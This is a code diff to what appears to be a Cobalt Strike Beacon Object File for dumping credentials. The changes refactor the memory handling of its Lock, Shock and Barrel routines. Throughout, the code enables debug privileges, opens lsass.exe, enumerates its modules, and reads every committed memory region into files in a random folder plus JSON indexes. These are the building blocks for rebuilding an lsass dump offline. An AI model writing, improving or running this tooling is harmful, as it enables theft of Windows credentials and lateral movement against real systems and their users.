@@ -3,8 +3,6 @@
 
 #define MAX_PATH 260
 #define MAX_MODULES 1024
-#define MAX_NAME_LENGTH 256
-#define JSON_BUFFER_SIZE 5096
 #define ALPHANUM "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
 #define ALPHANUM_SIZE (sizeof(ALPHANUM) - 1)
 
@@ -75,7 +73,7 @@ PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
     }
     long long value = *(long long*)buff;
     // BeaconPrintf(CALLBACK_OUTPUT, "buff: 0x%p \n", buff);
-    //KERNEL32$HeapAlloc(hHeap, 0, buff);
+    KERNEL32$HeapFree(hHeap, 0, buff);
     return (PVOID)value;
 }
 
@@ -193,7 +191,6 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
     // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
 
     PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
-    // TO ADD: KERNEL32$HeapFree(hHeap, 0, pbi_addr);
     PVOID pebaddress = *(PVOID*)peb_pointer;
     // BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: 0x%p\n", pebaddress);
 
@@ -211,6 +208,8 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
     char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
     // BeaconPrintf(CALLBACK_OUTPUT, "[+] commandline_value: %s\n", commandline_value);
 
+    KERNEL32$HeapFree(hHeap, 0, pbi_addr);
+    
     //BeaconPrintf(CALLBACK_OUTPUT, "[+] Function end.\n");
     return commandline_value;
 }
@@ -222,6 +221,7 @@ HANDLE GetProcessByName(const char* proc_name) {
 
     // Iterate processes
     while ((status = NTDLL$NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle)) == 0) {
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling GetProcNameFromHandle()\n");
         char* current_proc_name = GetProcNameFromHandle(aux_handle);
         // BeaconPrintf(CALLBACK_OUTPUT, "[+] Process: %s.\n", current_proc_name);
         
@@ -334,6 +334,9 @@ ModuleInformation* CustomGetModuleHandle(HANDLE process_handle, int* out_module_
         next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
     }
 
+    // KERNEL32$HeapFree(hHeap, 0, module_list); // <---
+
+    /*
     ModuleInformation* new_module_list = (ModuleInformation*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ModuleInformation) * module_counter);
     for (int i = 0; i < module_counter; i++) {
         new_module_list[i] = module_list[i];
@@ -342,8 +345,13 @@ ModuleInformation* CustomGetModuleHandle(HANDLE process_handle, int* out_module_
     KERNEL32$HeapFree(hHeap, 0, module_list);
 
     // Return the module list
-    *out_module_counter = module_counter;
+
     return new_module_list;
+    */
+
+    *out_module_counter = module_counter;
+    return module_list;
+
 }
 
 
@@ -478,6 +486,7 @@ int MyStrLen(char *str) {
 
 
 char* concatenate_strings(char* str1, char* str2) {
+    // BeaconPrintf(CALLBACK_OUTPUT, "Concatenate \n");
     HANDLE hHeap = KERNEL32$GetProcessHeap();
     if (hHeap == NULL) {
         return NULL; // Handle error
@@ -577,6 +586,7 @@ void replace_backslash(const char* str, char* result, int result_size){
 
 
 void write_string_to_file(char* file_path, char* data, int data_len, BOOLEAN debug) {
+    // BeaconPrintf(CALLBACK_OUTPUT, "write_string_to_file - file_path: %s\n", file_path);
     // CreateFile
     HANDLE hFile = KERNEL32$CreateFileA(
         file_path,                // File path
@@ -587,6 +597,7 @@ void write_string_to_file(char* file_path, char* data, int data_len, BOOLEAN deb
         FILE_ATTRIBUTE_NORMAL,    // Normal file attributes
         NULL                      // No template file
     );
+    // BeaconPrintf(CALLBACK_OUTPUT, "File path: %s hFile: %d\n", file_path, hFile);
     if (hFile == INVALID_HANDLE_VALUE) {
         BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
         return;
@@ -602,6 +613,9 @@ void write_string_to_file(char* file_path, char* data, int data_len, BOOLEAN deb
         &bytesWritten,            // Number of bytes written
         NULL                      // Overlapped not used
     );
+    // BeaconPrintf(CALLBACK_OUTPUT, "bytesWritten: \t\t%d\n", bytesWritten);
+    // BeaconPrintf(CALLBACK_OUTPUT, "result:       \t\t%d\n", result);
+
     if (!result) {
         BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
     } else {
@@ -688,31 +702,49 @@ char* get_json_barrel(MemFile* memfile_list, int memfile_count){
 }
 
 
-void dump_files(MemFile* memfile_list, int memfile_count){
-    // Create folder
-    // char* barrel_folder_name = "barrel_output";
-    char* barrel_folder_name[10];
-    generate_random_string(barrel_folder_name, 10);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created folder: \t\t%s\n", barrel_folder_name);
-    BOOL result;
-    // result = KERNEL32$RemoveDirectoryA(barrel_folder_name);
-    result = KERNEL32$CreateDirectoryA(barrel_folder_name, NULL);
-    for (int i = 0; i < memfile_count; i++) {
-        char* fname =concatenate_strings(concatenate_strings(barrel_folder_name, "\\"), memfile_list[i].filename);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Creating file %s (File %d)\n", fname, (i+1));
-        write_string_to_file(fname, memfile_list[i].content, memfile_list[i].size, FALSE);
+void free_concatenated_string(char* str) {
+    if (str != NULL) {
+        HANDLE hHeap = KERNEL32$GetProcessHeap();
+        if (hHeap != NULL) {
+            KERNEL32$HeapFree(hHeap, 0, str);
+        }
     }
 }
 
 
-void Barrel(){
+void dump_files(MemFile* memfile_list, int memfile_count){
+    // Create folder
+    // char* barrel_folder_name = "barrel_output";
+    char* barrel_folder_name[10];
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling generate_random_string()\n");
+    generate_random_string(barrel_folder_name, 10);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created folder: \t\t%s\n", barrel_folder_name);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Number of modules:\t\t%d\n", memfile_count);
+    // result = KERNEL32$RemoveDirectoryA(barrel_folder_name);
+    BOOL result;
+    result = KERNEL32$CreateDirectoryA(barrel_folder_name, NULL);
+    for (int i = 0; i < memfile_count; i++) {
+        char* aux_fname = concatenate_strings(barrel_folder_name, "\\");
+        char* fname = concatenate_strings(aux_fname, memfile_list[i].filename);
+        // char* fname = memfile_list[i].filename;
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] Creating file %s (File %d)\n", fname, (i+1));
+        write_string_to_file(fname, memfile_list[i].content, memfile_list[i].size, FALSE);
+        free_concatenated_string(aux_fname);
+        free_concatenated_string(fname);
+    }
+}
+
+
+void Barrel(HANDLE hProcess){
     char* filename = "barrel.json";
-    EnableDebugPrivileges();
-    HANDLE currentProcess = KERNEL32$GetCurrentProcess();
+    //// EnableDebugPrivileges();
+    // HANDLE currentProcess = KERNEL32$GetCurrentProcess();
     // BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);
-    GetProcNameFromHandle(currentProcess);
-    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling GetProcNameFromHandle()\n");
+    // GetProcNameFromHandle(currentProcess);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling GetProcessByName()\n");
+    //// HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
+    //// BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
     
     long long proc_max_address_l = 0x7FFFFFFEFFFF;
     PVOID mem_address = 0;
@@ -724,27 +756,16 @@ void Barrel(){
     MemFile* memfile_list = (MemFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(MemFile) * MAX_MODULES);
 
     while ((long long)mem_address < proc_max_address_l) {
+        // Populate MEMORY_BASIC_INFORMATION struct
         MEMORY_BASIC_INFORMATION mbi;
         SIZE_T returnSize;
-
-        int memory_basic_information_size = sizeof(MEMORY_BASIC_INFORMATION);
-        PVOID mbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, memory_basic_information_size);
-        if (mbi_addr == NULL) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
-            return ;
-        }
-        // BeaconPrintf(CALLBACK_OUTPUT, "[+] MBI Addr: 0x%p.\n", mbi_addr);
-
-
-        // Populate MEMORY_BASIC_INFORMATION struct
         NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
 
         // If readable and committed --> Get information
         if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
             // Get random name
-            //BeaconPrintf(CALLBACK_OUTPUT, "[+] Mem Addr: 0x%p\tmbi.RegionSize: 0x%p\n", mem_address, mbi.RegionSize);
-            char random_name[15];
-            generate_fixed_string_with_dot(random_name);
+            // char random_name[15];
+            // generate_fixed_string_with_dot(random_name);
             // BeaconPrintf(CALLBACK_OUTPUT, "[+] fname: \t\t%s\n", random_name);
 
             // Read bytes
@@ -764,30 +785,26 @@ void Barrel(){
             char* buffer_name[17];
             MyIntToHexStr((long long) mem_address, buffer_name);
             MyStrcpy(memFile.filename, buffer_name, 17);
-            // MyStrcpy(memFile.filename, random_name, 15);
-            
             memFile.content = (unsigned char*) buffer;
-            // BeaconPrintf(CALLBACK_OUTPUT, "regionSize: \t%d\n", regionSize);
-            // memFile.content = (unsigned char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, regionSize);
-            // MyStrcpy((unsigned char*)memFile.content, buffer, regionSize);
-
-            //// BeaconPrintf(CALLBACK_OUTPUT, "[+] Address: 0x%14X\tName: %s\n", mem_address, random_name);
-            for (size_t i = 0; i < 16; i++) {
-                unsigned char* test = (unsigned char*) buffer;
-                ////// BeaconPrintf(CALLBACK_OUTPUT, "%02X ", test[i]);  // Print each byte in hexadecimal (02X ensures two digits with leading zero)
-            }
-            ///// BeaconPrintf(CALLBACK_OUTPUT, "\n");
-
             memFile.size = mbi.RegionSize;
             memFile.address = mem_address;
             memfile_list[memfile_count++] = memFile;
+            //KERNEL32$HeapFree(hHeap, 0, buffer);
         }
 
         // BeaconPrintf(CALLBACK_OUTPUT, "[+] mem_address: \t0x%p\n", mem_address);
         mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
-        KERNEL32$HeapFree(hHeap, 0, mbi_addr);
     }
     
+    /*
+    MemFile* new_memfile_list = (MemFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(MemFile) * memfile_count);
+    for (int i = 0; i < memfile_count; i++) {
+        new_memfile_list[i] = memfile_list[i];
+    }
+
+    KERNEL32$HeapFree(hHeap, 0, memfile_list); // <--- 2
+    */
+
     char* json_output = get_json_barrel(memfile_list, memfile_count);
     int data_len = MyStrLen(json_output);
     write_string_to_file(filename, json_output, data_len, TRUE);
@@ -833,18 +850,21 @@ char* get_json_shock(ModuleInformation* module_list, int module_counter){
     }
     json_output = concatenate_strings(json_output, "]");
     // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_output);
-    // KERNEL32$HeapFree(hHeap, 0, buffer);
+    //free_concatenated_string(json_output);
+    KERNEL32$HeapFree(hHeap, 0, buffer);
     return json_output;
 }
 
 
-void Shock(){
+void Shock(HANDLE* hProcessOutput){
     char* filename = "shock.json";
     EnableDebugPrivileges();
-    HANDLE currentProcess = KERNEL32$GetCurrentProcess();
+    // HANDLE currentProcess = KERNEL32$GetCurrentProcess();
     // BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);
-    GetProcNameFromHandle(currentProcess);
+    // GetProcNameFromHandle(currentProcess);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling GetProcessByName()\n");
     HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
+    *hProcessOutput = hProcess;
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
     int module_counter = 0;
     ModuleInformation* module_list = CustomGetModuleHandle(hProcess, &module_counter);
@@ -856,29 +876,16 @@ void Shock(){
     char aux_name[MAX_PATH] = "";
 
     while ((long long)mem_address < proc_max_address_l) {
+        // Populate MEMORY_BASIC_INFORMATION struct
         MEMORY_BASIC_INFORMATION mbi;
         SIZE_T returnSize;
-
-        int memory_basic_information_size = sizeof(MEMORY_BASIC_INFORMATION);
-        HANDLE hHeap = KERNEL32$GetProcessHeap();
-        PVOID mbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, memory_basic_information_size);
-        if (mbi_addr == NULL) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
-            return "";
-        }
-        // BeaconPrintf(CALLBACK_OUTPUT, "[+] MBI Addr: 0x%p.\n", mbi_addr);
-
-
-        // Populate MEMORY_BASIC_INFORMATION struct
         NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
 
         // If readable and committed --> Get information
         if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
-            //BeaconPrintf(CALLBACK_OUTPUT, "[+] Mem Addr: 0x%p\tmbi.RegionSize: 0x%p\n", mem_address, mbi.RegionSize);
-            
             // Find the module by name
             ModuleInformation aux_module = find_module_by_name(module_list, module_counter, aux_name);
-            
+
             if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
                 aux_module.size = aux_size;
                 // Find module index
@@ -887,8 +894,7 @@ void Shock(){
 
                 for (int k = 0; k < module_counter; k++) {
                     if (mbi.BaseAddress == module_list[k].dll_base) {                        
-                        //strcpy(aux_name, module_list[k].base_dll_name);
-                        MyStrcpy(aux_name, module_list[k].base_dll_name, MAX_NAME_LENGTH);
+                        MyStrcpy(aux_name, module_list[k].base_dll_name, MAX_PATH);
                         aux_size = (int)mbi.RegionSize;
                     }
                 }
@@ -898,14 +904,11 @@ void Shock(){
             }
         }
         mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
-        KERNEL32$HeapFree(hHeap, 0, mbi_addr);
     }
 
     char* json_output = get_json_shock(module_list, module_counter);
-    // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_output);
     int json_output_len = MyStrLen(json_output);
     write_string_to_file(filename, json_output, json_output_len, TRUE);
-    sleep(0);
 }
 
 
@@ -934,6 +937,7 @@ void Lock(){
 
 void go() {
     Lock();
-    Shock();
-    Barrel();
+    HANDLE hProcess;
+    Shock(&hProcess);
+    Barrel(hProcess);
 }
